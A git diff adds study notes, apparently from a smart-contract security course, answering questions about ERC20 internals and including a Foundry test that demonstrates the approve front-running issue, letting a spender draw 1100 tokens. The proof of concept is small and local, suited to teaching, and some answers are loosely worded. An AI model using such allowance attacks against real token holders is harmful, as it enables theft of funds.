@@ -84,3 +84,85 @@ contract exploitTest is Test {
 ```
 
 ## Group Assignments
+
+<https://docs.google.com/presentation/d/1rjvzU7y3j6_k4SY-PuKBs-F7jb4E4UZwPqKDohSYJas/edit#slide=id.g269bc814b66_0_107>
+
+##### Q: Why the state variable _totalSupply is set to private?
+
+these private states indicate that these variables should not be allowd to be modified or also be inherited the corresponding contract
+
+##### Q: Why the state variable _balances is set to private?
+
+The methodology remains the same, ensuring that they are not visible in derived contracts
+
+##### Q: What is difference between _msgSender() and msg.sender?
+
+The _msgSender() is a virtual function that can be overridden, so for a basic smart contract, it doesn't do much, it just returns msg.sender
+
+But for a GSN-like contract, _msgSender is overridden and_msgSender would return the sender via payload(maybe msg.data) and not the actual caller
+
+##### Q: Why the state variable _allowances is set to private ?
+
+The methodology remains the same, ensuring that they are not visible in derived contracts
+
+##### Q: What is the potential risk of directly overwriting the old value of _allowance? (Write a PoC to validate it)
+
+Poc Action : Allowance front-run attack
+
+* Front run ERC20 approve
+* Owner approves 1000
+* Spender spend 1000
+* Owner updates approval to 100
+* Spender spend 100
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.22;
+
+import {Test, console2} from "forge-std/Test.sol";
+import {Token} from "../src/Token.sol";
+
+contract ERC20ApproveTest is Test {
+    // Front run ERC20 approve
+    // 1. Owner approves 1000
+    // 2. Spender spend 1000
+    // 3. Owner updates approval to 100
+    // 4. Spender spend 100
+    Token private token;
+    address private constant owner = address(11);
+    address private constant spender = address(12);
+
+    function setUp() public {
+        token = new Token("token", "TOKEN", 18);
+        token.mint(owner, 2000);
+    }
+
+    function test() public {
+        // Owner approves 1000
+        vm.prank(owner);
+        token.approve(spender, 1000);
+
+        // Spender spends 1000
+        vm.prank(spender);
+        token.transferFrom(owner, spender, 1000);
+
+        // Owner updates approval to 100
+        vm.prank(owner);
+        token.approve(spender, 100);
+
+        // Spender spends 100
+        vm.prank(spender);
+        token.transferFrom(owner, spender, 100);
+
+        console2.log("spender balance", token.balanceOf(spender));
+    }
+}
+```
+
+##### Q: Zero address is invalid in ERC721, but not in ERC20 and ERC1155. Why?
+
+ERC-20 and ERC-1155, on the other hand, do not have this restriction by default, and the decision to support or disallow transfers to the zero address is left to the developers implementing those standards
+
+##### Q: What doest the assembly block actually do?
+
+Solidity Assembly allowing developers to write lower-level code directly
